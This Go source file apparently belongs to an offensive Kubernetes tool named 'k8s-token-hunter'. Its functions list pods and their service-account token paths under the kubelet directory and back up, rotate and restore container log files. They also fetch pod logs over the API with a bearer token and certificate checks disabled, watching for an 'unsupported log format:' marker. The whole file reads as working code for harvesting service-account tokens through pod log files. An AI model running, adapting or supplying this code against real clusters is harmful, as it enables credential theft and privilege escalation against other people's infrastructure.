package internal

import (
	"crypto/tls"
	"fmt"
	"io"
	"io/fs"
	"k8s-token-hunter/fileops"
	"k8s-token-hunter/model"
	"log"
	"net/http"
	"path/filepath"
	"sort"
	"strings"
)

func RetrievePodLogs(pod *model.PodDestinationConfig) (bool, string, error) {
	url := fmt.Sprintf("https://%s/api/v1/namespaces/%s/pods/%s/log?container=%s", pod.APIServerAddr, pod.Namespace, pod.PodName, pod.ContainerName)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false, "", fmt.Errorf("error creating request: %w", err)
	}

	req.Header.Add("Authorization", "Bearer "+pod.SaToken)

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		return false, "", fmt.Errorf("error executing request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return false, "", fmt.Errorf("received non-OK status code: %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)

	if err != nil {
		return false, "", fmt.Errorf("error reading response body: %w", err)
	}

	phrase := "unsupported log format:"
	if strings.Contains(string(body), phrase) {
		return true, string(body), nil
	}

	return false, string(body), nil
}

func FindAuthorizedPod(relativePath string, directories []fs.DirEntry, token string) (*model.PodDestinationConfig, error) {
	for _, directory := range directories {
		dirParts := strings.Split(directory.Name(), "_")
		if len(dirParts) < 3 {
			return nil, fmt.Errorf("invalid file name format: %s", directory.Name())
		}

		namespace := dirParts[0]

		if !checkPermissions(token, namespace) {
			continue
		}

		podConfig := model.PodDestinationConfig{
			SaToken:   token,
			Namespace: namespace,
			PodName:   dirParts[1],
			UUID:      dirParts[2],
		}

		// Attempt to set the container name.
		containerPath := filepath.Join(relativePath, directory.Name())
		containers, err := fileops.MapFiles(containerPath)
		if err != nil {
			return nil, fmt.Errorf("failed to read directory: %v", err)
		}

		if len(containers) == 0 {
			return nil, fmt.Errorf("no containers found in path: %s", containerPath)
		}
		podConfig.ContainerName = containers[0].Name()

		// Attempt to set the log file path and name.
		logFilePath := containerPath + "/" + podConfig.ContainerName
		podConfig.LogFilePath = logFilePath

		logFile, err := getLatestLogFile(logFilePath)
		if err != nil {
			return nil, fmt.Errorf("failed to get latest log file: %v", err)
		}
		podConfig.LogFile = logFile.Name()
		podConfig.Path = logFilePath + "/" + podConfig.LogFile

		log.Println("Full destination path:", podConfig.Path)
		return &podConfig, nil
	}

	return nil, fmt.Errorf("no authorized pod found")
}

func getLatestLogFile(logFilePath string) (fs.DirEntry, error) {
	logFiles, err := fileops.MapFiles(logFilePath)
	if err != nil {
		return nil, err // Return nil and the error
	}

	// If the directory is empty, return an error.
	if len(logFiles) == 0 {
		return nil, fmt.Errorf("no log files found in the directory: %s", logFilePath)
	}

	sort.Slice(logFiles, func(i, j int) bool {
		return logFiles[i].Name() < logFiles[j].Name()
	})

	// Get the last log file from the slice.
	logFile := logFiles[len(logFiles)-1]

	info, err := logFile.Info()
	if err != nil {
		return nil, err
	}
	if info.IsDir() {
		return nil, fmt.Errorf("the last log entry is a directory, not a file: %s", logFile.Name())
	}

	return logFile, nil // Return the last log file and a nil error
}

func updateLogFiles(originalPath, logFilePath, currLogFile, dstPath, currBackupPath string) (string, string, string, error) {
	lastLogFile, err := getLatestLogFile(logFilePath)
	if err != nil {
		return "", "", "", fmt.Errorf("failed to retrieve the last log file: %w", err)
	}
	lastLogFileName := lastLogFile.Name()
	if lastLogFileName != currLogFile && !strings.Contains(lastLogFileName, "_backup") {
		fileops.RestoreFile(currBackupPath, dstPath)
		originalPath, backupPath, err := fileops.PerformBackUp(filepath.Join(logFilePath, lastLogFileName))
		if err != nil {
			return "", "", "", fmt.Errorf("failed to backup the file: %w", err)
		}

		log.Printf("Log file rotated. Update last log file to: %s from: %s\n", lastLogFileName, currLogFile)
		return originalPath, lastLogFileName, backupPath, nil
	}
	return originalPath, currLogFile, currBackupPath, nil
}

func AssembleKubeletPodsList(files []fs.DirEntry, targetNs string) (*model.KubeletPodsSpec, error) {
	kubeletPods := model.KubeletPodsSpec{
		Namespaces: make([]string, 0, len(files)),
		Pods:       make([]string, 0, len(files)),
		UUIDs:      make([]string, 0, len(files)),
		Paths:      make([]string, 0, len(files)),
	}

	for _, file := range files {
		fileParts := strings.Split(file.Name(), "_")
		if len(fileParts) != 3 {
			log.Printf("Unexpected file format: %s\n", file.Name())
			continue
		}

		namespace, podName, uuid := fileParts[0], fileParts[1], fileParts[2]

		// Check if the file namespace matches the target namespace (if specified).
		if targetNs != "" && namespace != targetNs {
			continue
		}

		// Append pod details to the kubeletPods fields.
		kubeletPods.Namespaces = append(kubeletPods.Namespaces, namespace)
		kubeletPods.Pods = append(kubeletPods.Pods, podName)
		kubeletPods.UUIDs = append(kubeletPods.UUIDs, uuid)
		kubeletPods.Paths = append(kubeletPods.Paths, filepath.Join(varLibKubeletPods, uuid, srcPodKubeApiAccess))
	}

	if len(kubeletPods.Namespaces) == 0 {
		return nil, fmt.Errorf("no matching pods found under %v namespace", targetNs)
	}

	return &kubeletPods, nil
}
